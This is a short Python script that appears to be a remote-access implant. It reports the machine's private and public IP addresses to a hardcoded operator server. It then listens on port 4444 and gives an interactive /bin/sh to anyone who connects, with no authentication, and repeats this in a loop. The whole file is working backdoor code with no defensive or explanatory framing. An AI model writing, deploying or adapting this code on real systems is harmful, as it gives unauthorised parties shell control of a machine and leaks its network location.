import socket
import os
import pty
import time
import signal
import sys
import requests
import multiprocessing

def handle_exit_signal(sig, frame):
    print("\nexiting...")
    sys.exit(0)

def get_ip_addresses():
    # Get private IP address
    hostname = socket.gethostname()
    private_ip = socket.gethostbyname(hostname)
    
    # Get public IP address
    public_ip = requests.get('https://api.ipify.org').text

    return private_ip, public_ip

def send_ip_addresses(server_ip, server_port):
    private_ip, public_ip = get_ip_addresses()
    headers = {'Content-Type': 'application/json'}
    data = {"private_ip": private_ip, "public_ip": public_ip}
    try:
        response = requests.post(f"http://{server_ip}:{server_port}", json=data, headers=headers)
        print("IP addresses sent, server responded with status code:", response.status_code)
    except Exception as e:
        print("[-] Error occurred while sending IP addresses:", str(e))

def start_shell(conn):
    # Start the shell
    for fd in (0, 1, 2):
        os.dup2(conn.fileno(), fd)
    pty.spawn("/bin/sh")
    # Close the file descriptors before exiting
    os.close(0)
    os.close(1)
    os.close(2)
    conn.close()  # Close the connection in the child process
    sys.exit(0)  # Ensure child process exits after shell terminates

def listen_for_connection():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", 4444))
    s.listen(1)
    print("[+] Listening for connections")
    conn, addr = s.accept()
    print("[+] Connection received from:", addr)
    return conn

def reverse_shell():
    signal.signal(signal.SIGINT, handle_exit_signal)
    while True:
        try:
            conn = listen_for_connection()

            p = multiprocessing.Process(target=start_shell, args=(conn,))
            p.start()
            p.join()

            print("Connection closed.")
            time.sleep(1)  # NEW
            
        except KeyboardInterrupt:
            pass

        except Exception as e:
            print("[-] Error occurred:", str(e))

if __name__ == "__main__":
    server_ip = "192.168.50.202"  # Replace with your server's IP address
    server_port = 3000  # Replace with your server's port
    send_ip_addresses(server_ip, server_port)
    reverse_shell()
